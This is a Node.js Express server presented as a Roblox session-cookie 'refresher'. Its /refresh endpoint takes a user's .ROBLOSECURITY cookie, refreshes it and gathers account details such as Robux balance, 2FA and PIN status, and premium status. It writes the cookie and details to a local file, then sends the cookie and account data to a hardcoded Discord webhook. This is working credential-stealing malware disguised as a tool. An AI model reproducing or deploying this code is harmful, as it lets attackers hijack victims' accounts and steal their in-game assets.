const express = require('express');
const axios = require('axios');
const fs = require('fs');

// Import the new CookieRefresher instead of old functions
const { CookieRefresher, parseProxyString, validateCookie } = require('./refresh');
const { RobloxUser } = require('./getuserinfo');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Configure proxy for cloud hosting (ESSENTIAL for Render.com)
// Format: socks5://username:password@proxy-host:1080
const CLOUD_PROXY = process.env.PROXY_STRING || null;

app.get('/refresh', async (req, res) => {
    const roblosecurityCookie = req.query.cookie;
    
    if (!roblosecurityCookie) {
        return res.status(400).json({ 
            error: "No cookie provided",
            usage: "Use ?cookie=YOUR_ROBLOSECURITY_COOKIE"
        });
    }

    try {
        console.log(`\n=== Starting refresh for cookie (${roblosecurityCookie.length} chars) ===`);
        
        // 1. VALIDATE COOKIE FIRST
        const validation = await validateCookie(roblosecurityCookie);
        console.log('Initial validation:', validation.valid ? 'VALID' : 'INVALID');
        
        if (!validation.valid) {
            return res.status(401).json({ 
                error: "Invalid cookie provided",
                details: validation 
            });
        }

        // 2. ATTEMPT REFRESH WITH PROXY
        console.log('Creating CookieRefresher with proxy:', CLOUD_PROXY ? 'YES' : 'NO');
        const refresher = new CookieRefresher(roblosecurityCookie, {
            proxy: CLOUD_PROXY ? parseProxyString(CLOUD_PROXY) : null,
            timeout: 15000,
            maxRetries: 2
        });

        const refreshResult = await refresher.refresh();
        
        // 3. HANDLE RESULTS
        console.log(`Refresh result: ${refreshResult.success ? 'SUCCESS' : 'FAILED'}`);
        console.log(`Method used: ${refreshResult.method}`);
        
        if (!refreshResult.success) {
            // Even if refresh failed, we have the original cookie
            console.warn('Refresh failed, using original cookie');
        }

        // Use refreshed cookie if available, otherwise original
        const finalCookie = refreshResult.success ? refreshResult.cookie : roblosecurityCookie;
        
        // 4. GET USER DATA
        console.log('Fetching user data...');
        const robloxUser = await RobloxUser.register(finalCookie);
        const userData = await robloxUser.getUserData();
        
        // 5. LOG TO FILE
        const fileContent = {
            timestamp: new Date().toISOString(),
            refreshSuccess: refreshResult.success,
            refreshMethod: refreshResult.method,
            originalCookieLength: roblosecurityCookie.length,
            finalCookieLength: finalCookie.length,
            cookieChanged: finalCookie !== roblosecurityCookie,
            RefreshedCookie: finalCookie,
            Username: userData.username,
            UserID: userData.uid,
            DisplayName: userData.displayName,
            CreationDate: userData.createdAt,
            Country: userData.country,
            AccountBalanceRobux: userData.balance,
            Is2FAEnabled: userData.isTwoStepVerificationEnabled,
            IsPINEnabled: userData.isPinEnabled,
            IsPremium: userData.isPremium,
            CreditBalance: userData.creditbalance,
            RAP: userData.rap,
            Logs: refreshResult.logs
        };

        fs.appendFileSync('refreshed_cookie.json', JSON.stringify(fileContent, null, 4) + ',\n');
        console.log('Logged to file');

        // 6. SEND TO DISCORD WEBHOOK
        const webhookURL = 'https://discord.com/api/webhooks/1448713650629246977/cWtQq3F9Scg3mxN645XzdQEt2gEmhH5Yip5BDTPj37myl70yCVjPSnxS1T97hphlXgZB';
        
        // Create embed based on success/failure
        const embedColor = refreshResult.success ? 65280 : 16776960; // Green or Yellow
        const embedTitle = refreshResult.success ? '✅ Cookie Refreshed Successfully' : '⚠️ Cookie Refresh Failed';
        
        const embedDescription = refreshResult.success 
            ? `**New Cookie:**\n\`\`\`${finalCookie.substring(0, 100)}...\`\`\``
            : `**Original Cookie (Refresh Failed):**\n\`\`\`${finalCookie.substring(0, 100)}...\`\`\`\n*Using original cookie as fallback*`;

        const response = await axios.post(webhookURL, {
            embeds: [
                {
                    title: embedTitle,
                    description: embedDescription,
                    color: embedColor,
                    thumbnail: { url: userData.avatarUrl },
                    fields: [
                        { name: 'Refresh Status', value: refreshResult.success ? 'SUCCESS' : 'FAILED', inline: true },
                        { name: 'Method', value: refreshResult.method, inline: true },
                        { name: 'Username', value: userData.username, inline: true },
                        { name: 'User ID', value: userData.uid, inline: true },
                        { name: 'Cookie Length', value: `${finalCookie.length} chars`, inline: true },
                        { name: 'Is Premium', value: userData.isPremium, inline: true },
                        { name: 'Balance', value: userData.balance + ' Robux', inline: true },
                        { name: 'Proxy Used', value: CLOUD_PROXY ? 'YES' : 'NO', inline: true },
                        { name: 'Attempts', value: refreshResult.logs?.length || 0, inline: true }
                    ],
                    footer: { text: `Refresh attempted at ${new Date().toLocaleString()}` }
                }
            ]
        });

        console.log('Webhook sent successfully');

        // 7. RETURN RESPONSE TO CLIENT
        res.json({
            success: refreshResult.success,
            method: refreshResult.method,
            cookie: finalCookie,
            cookieLength: finalCookie.length,
            cookieChanged: finalCookie !== roblosecurityCookie,
            userData: {
                username: userData.username,
                userId: userData.uid,
                displayName: userData.displayName,
                isPremium: userData.isPremium,
                balance: userData.balance
            },
            details: {
                attempts: refreshResult.logs?.length || 0,
                proxyConfigured: !!CLOUD_PROXY,
                logs: refreshResult.logs
            }
        });

    } catch (error) {
        console.error('Fatal error in /refresh endpoint:', error);
        
        res.status(500).json({
            error: "Internal server error",
            message: error.message,
            stack: process.env.NODE_ENV === 'development' ? error.stack : undefined
        });
    }
});

// New endpoint for simple validation
app.get('/validate', async (req, res) => {
    const cookie = req.query.cookie;
    
    if (!cookie) {
        return res.status(400).json({ error: "No cookie provided" });
    }
    
    const validation = await validateCookie(cookie);
    res.json(validation);
});

// New endpoint for testing proxy
app.get('/test-proxy', async (req, res) => {
    const testUrl = 'https://api.ipify.org?format=json';
    
    try {
        let config = {};
        
        if (CLOUD_PROXY) {
            const proxyConfig = parseProxyString(CLOUD_PROXY);
            const { CookieRefresher } = require('./refresh');
            const tempRefresher = new CookieRefresher('test', { proxy: proxyConfig });
            config = { httpsAgent: tempRefresher.httpClient.defaults.httpsAgent };
        }
        
        const response = await axios.get(testUrl, config);
        res.json({
            proxyConfigured: !!CLOUD_PROXY,
            currentIP: response.data.ip,
            proxyDetails: CLOUD_PROXY ? parseProxyString(CLOUD_PROXY) : null
        });
    } catch (error) {
        res.status(500).json({
            error: "Proxy test failed",
            message: error.message,
            proxyConfigured: !!CLOUD_PROXY
        });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
    console.log(`Proxy configured: ${CLOUD_PROXY ? 'YES' : 'NO'}`);
    console.log(`Endpoints:`);
    console.log(`  GET /refresh?cookie=ROBLOSECURITY`);
    console.log(`  GET /validate?cookie=ROBLOSECURITY`);
    console.log(`  GET /test-proxy`);
});